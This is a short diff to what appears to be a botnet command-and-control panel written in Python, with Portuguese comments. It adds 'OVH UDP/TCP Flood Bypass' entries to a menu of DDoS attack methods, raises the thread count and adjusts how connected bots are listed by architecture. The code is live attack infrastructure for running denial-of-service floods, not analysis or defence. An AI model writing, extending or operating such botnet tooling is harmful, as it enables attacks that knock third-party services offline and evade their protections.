@@ -20,7 +20,7 @@ maxAttacks=30
 rootUser='root'
 
 # Não aumente de mais as threads (Você pode foder com seus bots)
-threads=30
+threads=32
 
 ansi_clear = '\033[2J\033[H'
 
@@ -66,6 +66,8 @@ def botnetMethodsName(method):
     method_name = {
         ".UDP": '     UDP Flood Bypass',
         ".TCP": '     TCP Flood Bypass',
+        ".OVHUDP": '  OVH UDP Flood Bypass',
+        ".OVHTCP": '  OVH TCP Flood Bypass',
         ".MIX": '     TCP and UDP Flood Bypass',
         ".SYN": '     TCP SYN Flood',
         ".HEX": '     HEX Flood',
@@ -97,10 +99,11 @@ def list_arch_counts(client, send):
         send(client, f'{Fore.LIGHTWHITE_EX}\nNo bots :C\n')
         return
 
-    send(client, f'{C}Connected bots: {G}{len(bots)}\n')
-    send(client, f'{C}Bots Architectures:')
+    send(client, f'{C}Connected bots: {G}{len(bots)}')
+    send(client, f'\n{C}Bots Architectures:')
     for i, (arch, bot_list) in enumerate(bots_by_arch.items(), 1):
-        send(client, f"     {C}{arch}: {G}{len(bot_list)}")
+        if len(bot_list) > 0:
+            send(client, f"     {C}{arch}: {G}{len(bot_list)}")
     send(client, '')
 
 def removeAttacks(username, timeout):
